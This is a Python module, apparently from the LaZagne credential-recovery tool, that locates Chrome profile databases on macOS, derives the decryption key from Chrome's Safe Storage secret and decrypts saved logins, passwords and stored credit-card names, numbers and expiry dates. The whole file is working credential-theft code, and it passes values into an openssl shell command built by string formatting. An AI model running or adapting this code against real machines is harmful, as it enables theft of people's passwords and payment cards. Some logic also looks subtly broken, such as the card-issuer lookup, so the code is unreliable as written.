# Awesome work from @manwhoami
# check the github repo: https://github.com/manwhoami/OSXChromeDecrypt

from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
import subprocess
import itertools
import binascii
import operator
import tempfile
import sqlite3
import shutil
import base64
import struct
import glob
import hmac
import os

### Big thanks to @mitsuhiko https://github.com/mitsuhiko/python-pbkdf2 for the below function pbkdf2_bin ###
def pbkdf2_bin(hash_fxn, password, salt, iterations, keylen=16):
    _pack_int   = struct.Struct('>I').pack
    hashfunc    = sha1
    mac         = hmac.new(password, None, hashfunc)
    
    def _pseudorandom(x, mac=mac):
        h = mac.copy()
        h.update(x)
        return map(ord, h.digest())
    
    buf = []
    for block in xrange(1, -(-keylen // mac.digest_size) + 1):
        rv = u = _pseudorandom(salt + _pack_int(block))
        for i in xrange(iterations - 1):
            u   = _pseudorandom(''.join(map(chr, u)))
            rv  = itertools.starmap(operator.xor, itertools.izip(rv, u))
        buf.extend(rv)
    
    return ''.join(map(chr, buf))[:keylen]

try:
    from hashlib import pbkdf2_hmac
except ImportError:
    # python version not available (Python <2.7.8, macOS < 10.11) use @mitsuhiko's pbkdf2 method
    pbkdf2_hmac = pbkdf2_bin
    from hashlib import sha1

class Chrome(ModuleInfo):
    def __init__(self, safe_storage_key=None):
        options = {'command': '-chrome', 'action': 'store_true', 'dest': 'chrome', 'help': 'Chrome passwords'}
        ModuleInfo.__init__(self, 'chrome', 'browsers', options)

        login_data_path         = '/Users/*/Library/Application Support/Google/Chrome/*/Login Data'
        cc_data_path            = '/Users/*/Library/Application Support/Google/Chrome/*/Web Data'
        self.chrome_data        = glob.glob(login_data_path) + glob.glob(cc_data_path)
        self.safe_storage_key   = safe_storage_key

    def get_cc(self, cc_num):
        cc_dict = {
                        3: 'AMEX', 
                        4: 'Visa', 
                        5: 'Mastercard', 
                        6: 'Discover'
                }
        try:
            return cc_dict[cc_num[0]]
        except KeyError:
            return 'Unknown Card Issuer'

    def chrome_decrypt(self, encrypted, iv, key): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
        hex_key = binascii.hexlify(key)
        hex_enc_password = base64.b64encode(encrypted[3:])

        # send any error messages to /dev/null to prevent screen bloating up
        try: 
            decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hex_key, hex_enc_password), shell=True)
        except Exception as e:
            decrypted = 'ERROR retrieving password'
        return decrypted

    def chrome_process(self, safe_storage_key, chrome_data):
        #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
        iv  = ''.join(('20',) * 16) 
        key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
        
        # work around for locking DB
        copy_path = tempfile.mkdtemp() 
        with open(chrome_data, 'r') as content:
            dbcopy = content.read()
        
        with open('%s/chrome' % copy_path, 'w') as content:
            # if chrome is open, the DB will be locked, so get around by making a temp copy
            content.write(dbcopy) 
        
        database = sqlite3.connect('%s/chrome' % copy_path)
        if 'Web Data' in chrome_data:
            sql = 'select name_on_card, card_number_encrypted, expiration_month, expiration_year from credit_cards'
        else:
            sql = 'select username_value, password_value, origin_url, submit_element from logins'
        
        decrypted_list = []
        with database:
            for values in database.execute(sql):
                # values will be (name_on_card, card_number_encrypted, expiration_month, expiration_year) or (username_value, password_value, origin_url, submit_element)
                # user will be empty if they have selected "never" store password
                if values[0] == '' or (values[1][:3] != b'v10'): 
                    continue
                else:
                    decrypted_list.append((str(values[2]).encode('ascii', 'ignore'), values[0].encode('ascii', 'ignore'), str(self.chrome_decrypt(values[1], iv, key)).encode('ascii', 'ignore'), values[3]))
        
        shutil.rmtree(copy_path)
        return decrypted_list

    def run(self, software_name=None):
        
        pwdFound  = []
        if not self.safe_storage_key:
            print_debug('WARNING', 'Chrome safe storage key has not been retrieved, cannot decrypt passwords')
            return
        else:
            print_debug('INFO', 'Chrome safe storage key has been retrieved: %s' % str(self.safe_storage_key))
            

        for profile in self.chrome_data:
            for i, x in enumerate(self.chrome_process(str(self.safe_storage_key), "%s" % profile)):
                if 'Web Data' in profile:
                    if i == 0:
                        pwdFound.append(
                                {
                                    'Type'              : self.get_cc(x[2]),
                                    'Card Name'         : x[1],
                                    'Account'           : x[2], 
                                    'Expiration Date'   : '%s/%s' % (x[0], x[3])
                                }
                            )
                else:
                    if i == 0:
                        pwdFound.append(
                            {
                                'Profile'       : profile.split('/')[-2],
                                'URL'           : x[0].strip(), 
                                'Account'       : x[1].strip(), 
                                'Password'      : x[2].strip(), 
                            }
                        )
        
        return pwdFound

